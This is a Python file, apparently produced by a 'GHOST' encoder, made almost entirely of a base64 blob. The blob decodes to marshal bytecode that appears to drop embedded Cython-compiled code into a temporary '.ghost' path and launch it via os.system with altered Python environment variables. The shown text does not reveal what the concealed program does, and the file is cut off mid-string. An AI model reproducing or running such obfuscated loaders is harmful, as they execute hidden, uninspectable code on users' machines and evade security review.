# THIS ENCODE BY GHOST | @GHOST_RFX â™¤
G,H,O,S,T,J,I,I = map(chr, [71, 72, 79, 83, 84, 74, 73, 73])
GH, OS, TJ, II = G+H, O+S, T+J, I+I
GHOST = G+H+O+S+T+J+I+I
import tempfile as t
from os import path as ghost_path, remove as grdmv, system as stem
from base64 import b64decode as lmao
ghostenc = (b'aW1wb3J0IG1hcnNoYWwKZXhlYyhtYXJzaGFsLmxvYWRzKGInXHhlM1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDhceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHhmM1x4MDhceDA0XHgwMFx4MDBceDk3XHgwMFx4MDJceDAwZVx4MDBlXHgwMWdceDAwZFx4MDBceGEyXHgwMVx4YTZceDAyXHgwMFx4MDBceGFiXHgwMlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXFxceDA4XHgwMFx4MDBaXHgwMlpceDAzWlx4MDRaXHgwNVpceDA2Wlx4MDdaXHgwOFpceDA4ZVx4MDJlXHgwM3pceDAwXHgwMFx4MDBlXHgwNGVceDA1elx4MDBceDAwXHgwMGVceDA2ZVx4MDd6XHgwMFx4MDBceDAwZVx4MDhlXHgwOHpceDAwXHgwMFx4MDBmXHgwNFxcXHgwNFx4MDBceDAwWlx0WlxuWlx4MGJaXHgwY2VceDAyZVx4MDN6XHgwMFx4MDBceDAwZVx4MDR6XHgwMFx4MDBceDAwZVx4MDV6XHgwMFx4MDBceDAwZVx4MDZ6XHgwMFx4MDBceDAwZVx4MDd6XHgwMFx4MDBceDAwZVx4MDh6XHgwMFx4MDBceDAwZVx4MDh6XHgwMFx4MDBceDAwWlxyZFx4MDFkXHgwMmxceDBlWlx4MGZkXHgwMWRceDAzbFx4MTBtXHgxMVpceDEybVx4MTNaXHgxNG1ceDE1Wlx4MTZceDAxXHgwMGRceDAxZFx4MDRsXHgxN21ceDE4Wlx4MTlceDAxXHgwMFx4MDJceDAwZVx4MWFkXHgwNVx4YTZceDAxXHgwMFx4MDBceGFiXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMVx4MDBceDAyXHgwMGVceDFhZFx4MDZceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwXHgwMlx4MDBlXHgxYWRceDA3XHhhNlx4MDFceDAwXHgwMFx4YWJceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAxXHgwMFx4MDJceDAwZVx4MWFkXHgwNlx4YTZceDAxXHgwMFx4MDBceGFiXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMVx4MDBceDAyXHgwMGVceDFiZFx4MDhceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMGpceDFjXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBaXHgxZGRcdFpceDFlZFxuXHgwMlx4MDBlXHgxYmRceDA4XHhhNlx4MDFceDAwXHgwMFx4YWJceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBqXHgxY1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwelx4MDBceDAwXHgwMFpceDFmZFx4MGJceDAyXHgwMGVceDFiZFx4MDhceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMGogXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDB6XHgwMFx4MDBceDAwWiFkXHgwY2VceDFlelx4MDBceDAwXHgwMFoiXHgwMlx4MDBlXHgxMmojXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBlXHgxZVx4YTZceDAxXHgwMFx4MDBceGFiXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwciJceDAyXHgwMGVceDE2ZVx4MWZkXHJ6XHgwMFx4MDBceDAwZSF6XHgwMFx4MDBceDAwZFxyelx4MDBceDAwXHgwMGUielx4MDBceDAwXHgwMFx4YTZceDAxXHgwMFx4MDBceGFiXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMVx4MDBceDAyXHgwMGUkZFx4MDFceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwZFx4MGVaJWRceDBmWiZkXHgxMFx4YTBcJ1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMlx4MDBlXHgxYmRceDA4XHhhNlx4MDFceDAwXHgwMFx4YWJceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBqKFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHhhMClceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMGRceDExXHhhNlx4MDFceDAwXHgwMFx4YWJceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBkXHgwMVx4MTlceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceGEwKVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwZFx4MTBceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMGRceDAyZFx4MTJceDg1XHgwMlx4MTlceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFoqZFx4MTNlXHgxZHpceDAwXHgwMFx4MDBkXHgxNHpceDAwXHgwMFx4MDBlKnpceDAwXHgwMFx4MDBkXHgxNXpceDAwXHgwMFx4MDBlXHgxZXpceDAwXHgwMFx4MDBkXHgxMXpceDAwXHgwMFx4MDBlJnpceDAwXHgwMFx4MDBkXHgxNnpceDAwXHgwMFx4MDBlXHgxZHpceDAwXHgwMFx4MDBkXHgxN3pceDAwXHgwMFx4MDBlKnpceDAwXHgwMFx4MDBaK1x4MDJceDAwZSxlJmRceDE4XHhhNlx4MDJceDAwXHgwMFx4YWJceDAyXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDA1XHgwMFotZS1ceGEwLlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwZSVceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwZFx4MDJkXHgwMmRceDAyXHhhNlx4MDJceDAwXHgwMFx4YWJceDAyXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAxXHgwMG5ceDBiI1x4MDAxXHgwMHNceDA0d1x4MDJ4XHgwM1lceDAwd1x4MDFceDAxXHgwMFlceDAwXHgwMVx4MDBceDAxXHgwMFx4MDJceDAwZVx4MWJkXHgxOVx4YTZceDAxXHgwMFx4MDBceGFiXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHhhMC9ceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDJceDAwZVx4MTJqMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwZVx4MWVceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMGRceDFhXHhhY1x4MWJceGE2XHgwMlx4MDBceDAwXHhhYlx4MDJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwXHgwMlx4MDBlXHgxNmVceDFmZFxyelx4MDBceDAwXHgwMGUhelx4MDBceDAwXHgwMGRccnpceDAwXHgwMFx4MDBlK3pceDAwXHgwMFx4MDBkXHJ6XHgwMFx4MDBceDAwZSJ6XHgwMFx4MDBceDAwXHhhNlx4MDFceDAwXHgwMFx4YWJceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAxXHgwMFx4MDJceDAwZVx4MTRlJlx4YTZceDAxXHgwMFx4MDBceGFiXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMVx4MDBkXHgwMlNceDAwKVx4MWMpXHgwOFx4ZTlHXHgwMFx4MDBceDAwXHhlOUhceDAwXHgwMFx4MDBceGU5T1x4MDBceDAwXHgwMFx4ZTlTXHgwMFx4MDBceDAwXHhlOVRceDAwXHgwMFx4MDBceGU5Slx4MDBceDAwXHgwMFx4ZTlJXHgwMFx4MDBceDAwclx4MDhceDAwXHgwMFx4MDBceGU5XHgwMFx4MDBceDAwXHgwME4pXHgwM1x4ZGFceDA0cGF0aFx4ZGFceDA2cmVtb3ZlXHhkYVx4MDZzeXN0ZW0pXHgwMVx4ZGFcdGI2NGRlY29kZXUhXHgwMFx4MDBceDAwXHgxYlsxOzkybVx4MWJbMzg7NTs0Nm1MT0FESU5HXHhlMlx4ODBceGEyXHhlMlx4ODBceGEyXHhlMlx4ODBceGEyXHhkYVx4MDB1PVx4MDBceDAwXHgwMFx4MWJbMTs5Mm1ceDFiWzM4OzU7NTBtIyMjI1RISVMgSVMgRU5DT0RFRCBCWSAjR0hPU1QgXHhlMlx4ODBceGEyIEBHSE9TVF9SRlhceGRhXHgwM3N5c3pcdC5naG9zdC9vcHpceDEyZXhwb3J0IFBZVEhPTkhPTUU9elx4MTlleHBvcnQgUFlUSE9OX0VYRUNVVEFCTEU9elx4MDIuL3pceDAyJiZhJWJcclx4MDBcblxuI2lmbmRlZiBQWV9TU0laRV9UX0NMRUFOXG4jZGVmaW5lIFBZX1NTSVpFX1RfQ0xFQU5cbiNlbmRpZiBcblxuI2lmIGRlZmluZWQoUHlfTElNSVRFRF9BUEkpXG4gICNpZiAhZGVmaW5lZChDWVRIT05fTElNSVRFRF9BUEkpXG4gICNkZWZpbmUgQ1lUSE9OX0xJTUlURURfQVBJIDFcbiAgI2VuZGlmXG4jZWxpZiBkZWZpbmVkKENZVEhPTl9MSU1JVEVEX0FQSSlcbiAgI2lmZGVmIF9NU0NfVkVSXG4gICNwcmFnbWEgbWVzc2FnZSAoIkxpbWl0ZWQgQVBJIHVzYWdlIGlzIGVuYWJsZWQgd2l0aCBcJ0NZVEhPTl9MSU1JVEVEX0FQSVwnIGJ1dCBcJ1B5X0xJTUlURURfQVBJXCcgZG9lcyBub3QgZGVmaW5lIGEgUHl0aG9uIHRhcmdldCB2ZXJzaW9uLiBDb25zaWRlciBzZXR0aW5nIFwnUHlfTElNSVRFRF9BUElcJyBpbnN0ZWFkLiIpXG4gICNlbHNlXG4gICN3YXJuaW5nIExpbWl0ZWQgQVBJIHVzYWdlIGlzIGVuYWJsZWQgd2l0aCBcJ0NZVEhPTl9MSU1JVEVEX0FQSVwnIGJ1dCBcJ1B5X0xJTUlURURfQVBJXCcgZG9lcyBub3QgZGVmaW5lIGEgUHl0aG9uIHRhcmdldCB2ZXJzaW9uLiBDb25zaWRlciBzZXR0aW5nIFwnUHlfTElNSVRFRF9BUElcJyBpbnN0ZWFkLlxuICAjZW5kaWZcbiNlbmRpZlxuXG4jaW5jbHVkZSAiUHl0aG9uLmgiXG4jaWZuZGVmIFB5X1BZVEhPTl9IXG4gICAgI2Vycm9yIFB5dGhvbiBoZWFkZXJzIG5lZWRlZCB0byBjb21waWxlIEMgZXh0ZW5zaW9ucywgcGxlYXNlIGluc3RhbGwgZGV2ZWxvcG1lbnQgdmVyc2lvbiBvZiBQeXRob24uXG4jZWxpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwMDBcbiAgICAjZXJyb3IgQ3l0aG9uIHJlcXVpcmVzIFB5dGhvbiAzLjgrLlxuI2Vsc2VcbiNkZWZpbmUgX19QWVhfQUJJX1ZFUlNJT04gIjNfMV82IlxuI2RlZmluZSBDWVRIT05fSEVYX1ZFUlNJT04gMHgwMzAxMDZGMFxuI2RlZmluZSBDWVRIT05fRlVUVVJFX0RJVklTSU9OIDFcblxuI2luY2x1ZGUgPHN0ZGRlZi5oPlxuI2lmbmRlZiBvZmZzZXRvZlxuICAjZGVmaW5lIG9mZnNldG9mKHR5cGUsIG1lbWJlcikgKCAoc2l6ZV90KSAmICgodHlwZSopMCkgLT4gbWVtYmVyIClcbiNlbmRpZlxuI2lmICFkZWZpbmVkKF9XSU4zMikgJiYgIWRlZmluZWQoV0lOMzIpICYmICFkZWZpbmVkKE1TX1dJTkRPV1MpXG4gICNpZm5kZWYgX19zdGRjYWxsXG4gICAgI2RlZmluZSBfX3N0ZGNhbGxcbiAgI2VuZGlmXG4gICNpZm5kZWYgX19jZGVjbFxuICAgICNkZWZpbmUgX19jZGVjbFxuICAjZW5kaWZcbiAgI2lmbmRlZiBfX2Zhc3RjYWxsXG4gICAgI2RlZmluZSBfX2Zhc3RjYWxsXG4gICNlbmRpZlxuI2VuZGlmXG4jaWZuZGVmIERMX0lNUE9SVFxuICAjZGVmaW5lIERMX0lNUE9SVCh0KSB0XG4jZW5kaWZcbiNpZm5kZWYgRExfRVhQT1JUXG4gICNkZWZpbmUgRExfRVhQT1JUKHQpIHRcbiNlbmRpZlxuI2RlZmluZSBfX1BZWF9DT01NQSAsXG4jaWZuZGVmIEhBVkVfTE9OR19MT05HXG4gICNkZWZpbmUgSEFWRV9MT05HX0xPTkdcbiNlbmRpZlxuI2lmbmRlZiBQWV9MT05HX0xPTkdcbiAgI2RlZmluZSBQWV9MT05HX0xPTkcgTE9OR19MT05HXG4jZW5kaWZcbiNpZm5kZWYgUHlfSFVHRV9WQUxcbiAgI2RlZmluZSBQeV9IVUdFX1ZBTCBIVUdFX1ZBTFxuI2VuZGlmXG4jZGVmaW5lIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggUFlfVkVSU0lPTl9IRVhcbiNpZiBkZWZpbmVkKEdSQUFMVk1fUFlUSE9OKVxuICBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgMFxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAwXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAwXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTCAxXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TUEVDUyAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVBcbiAgI2RlZmluZSBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVJcbiAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUyAwXG4gICN1bmRlZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAjZGVmaW5lIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTIDFcbiAgI3VuZGVmIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlNcbiAgI2RlZmluZSBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIDFcbiAgI3VuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TIDBcbiAgI3VuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgMFxuICAjdW5kZWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICNkZWZpbmUgQ1lUSE9OX1VOUEFDS19NRVRIT0RTIDBcbiAgI3VuZGVmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuICAjZGVmaW5lIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURSAwXG4gICN1bmRlZiBDWVRIT05fRkFTVF9HSUxcbiAgI2RlZmluZSBDWVRIT05fRkFTVF9HSUwgMFxuICAjdW5kZWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgI2RlZmluZSBDWVRIT05fTUVUSF9GQVNUQ0FMTCAwXG4gICN1bmRlZiBDWVRIT05fRkFTVF9QWUNBTExcbiAgI2RlZmluZSBDWVRIT05fRkFTVF9QWUNBTEwgMFxuICAjaWZuZGVmIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTU1xuICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTIDFcbiAgI2VuZGlmXG4gICN1bmRlZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVRcbiAgI2RlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQgMVxuICAjdW5kZWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEVcbiAgI2RlZmluZSBDWVRIT05fVVNFX01PRFVMRV9TVEFURSAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9TWVNfTU9OSVRPUklORyAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRSAwXG4gICN1bmRlZiBDWVRIT05fVVNFX0FNX1NFTkRcbiAgI2RlZmluZSBDWVRIT05fVVNFX0FNX1NFTkQgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiAgI2RlZmluZSBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLIDFcbiAgI2lmbmRlZiBDWVRIT05fVVBEQVRFX0RFU0NSSVBUT1JfRE9DXG4gICAgI2RlZmluZSBDWVRIT05fVVBEQVRFX0RFU0NSSVBUT1JfRE9DIDBcbiAgI2VuZGlmXG4gICN1bmRlZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfRlJFRUxJU1RTIDBcbiNlbGlmIGRlZmluZWQoUFlQWV9WRVJTSU9OKVxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAxXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIDBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIDBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIDBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORyAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU0xPVFMgMVxuICAjaWZuZGVmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIDBcbiAgI2VuZGlmXG4gICN1bmRlZiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVBcbiAgI2RlZmluZSBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVJcbiAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUyAwXG4gICN1bmRlZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAjZGVmaW5lIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTIDFcbiAgI3VuZGVmIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlNcbiAgI2RlZmluZSBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIDFcbiAgI3VuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TIDBcbiAgI2lmbmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgMVxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAjZGVmaW5lIENZVEhPTl9VTlBBQ0tfTUVUSE9EUyAwXG4gICN1bmRlZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiAgI2RlZmluZSBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUgMFxuICAjdW5kZWYgQ1lUSE9OX0ZBU1RfR0lMXG4gICNkZWZpbmUgQ1lUSE9OX0ZBU1RfR0lMIDBcbiAgI3VuZGVmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICNkZWZpbmUgQ1lUSE9OX01FVEhfRkFTVENBTEwgMFxuICAjdW5kZWYgQ1lUSE9OX0ZBU1RfUFlDQUxMXG4gICNkZWZpbmUgQ1lUSE9OX0ZBU1RfUFlDQUxMIDBcbiAgI2lmbmRlZiBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1NcbiAgICAjZGVmaW5lIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTUyAxXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwXG4gICAgI3VuZGVmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVFxuICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUIDBcbiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUKVxuICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUIDFcbiAgI2VuZGlmXG4gICN1bmRlZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICAjZGVmaW5lIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkdcbiAgI2RlZmluZSBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HIDBcbiAgI2lmbmRlZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFIChQWVBZX1ZFUlNJT05fTlVNID49IDB4MDcwMzBDMDApXG4gICNlbmRpZlxuICAjdW5kZWYgQ1lUSE9OX1VTRV9BTV9TRU5EXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9BTV9TRU5EIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUyAwXG4gICN1bmRlZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSyAwXG4gICNpZm5kZWYgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQ1xuICAgICNkZWZpbmUgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQyAoUFlQWV9WRVJTSU9OX05VTSA+PSAweDA3MDMxMTAwKVxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9GUkVFTElTVFMgMFxuI2VsaWYgZGVmaW5lZChDWVRIT05fTElNSVRFRF9BUEkpXG4gICNpZmRlZiBQeV9MSU1JVEVEX0FQSVxuICAgICN1bmRlZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYXG4gICAgI2RlZmluZSBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIFB5X0xJTUlURURfQVBJXG4gICNlbmRpZlxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAwXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIDBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIDFcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIDBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORyAwXG4gICN1bmRlZiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLXG4gICNkZWZpbmUgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSyAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU0xPVFMgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIDFcbiAgI3VuZGVmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUFxuICAjZGVmaW5lIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMgMFxuICAjaWZuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVJcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIgMFxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUyAwXG4gICNpZm5kZWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAjZGVmaW5lIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTIDBcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGU1xuICAgICNkZWZpbmUgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUyAwXG4gICNlbmRpZlxuICAjdW5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0